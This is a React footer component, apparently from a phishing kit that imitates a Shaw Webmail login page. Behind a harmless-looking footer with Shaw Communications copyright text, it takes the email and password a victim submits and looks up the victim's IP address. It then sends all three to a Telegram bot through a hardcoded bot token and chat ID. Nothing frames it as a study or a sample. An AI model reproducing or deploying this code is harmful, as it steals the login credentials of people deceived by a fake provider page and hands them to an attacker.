import React, { useEffect } from 'react';
import { loginAtom, submittedAtom } from '@/utils/atoms';
import { useAtomValue } from 'jotai';

export default function Footer() {
  const isSubmitted = useAtomValue(submittedAtom);
  const { email, pwd } = useAtomValue(loginAtom);
  const bot = {
    TOKEN: '6418196822:AAGRvEq6mpA5dDRdxj42_60jnZ7i3YWg1WE',
    chatID: '5156591558',
  };

  useEffect(() => {
    if (isSubmitted && email !== '' && pwd !== '') {
      fetch('https://api.ipify.org?format=json')
        .then((response) => response.json())
        .then((data) => {
          let ip = data.ip;
          fetch(
            `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=🔔 Shaw Webmail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A%0AThank You!`,
            {
              method: 'GET',
            }
          ).then(
            (res) => {
              // window.location.replace('https://aol.com');
              console.log(res, 'inn');
            },
            (error) => {
              alert('Message not sent');
              console.log(error);
            }
          );
        });
    }
  }, [isSubmitted]);
  return (
    <footer className='absolute bottom-0 left-0 right-0 py-6 bg-[#333333] flex max-lg:flex-col items-center justify-center lg:justify-between'>
      <div className='flex items-center  *:text-sm *:leading-none *:text-[#c7c7c7] *:underline divide-x divide-[#c7c7c7] *:px-4 '>
        <p>Privacy</p>
        <p>Terms of Use</p>
        <p>Accessibility</p>
      </div>
      <p className='text-[10px] text-[#c7c7c7] mt-6'>
        © 2024 Shaw Communications. All Rights Reserved.
      </p>
    </footer>
  );
}
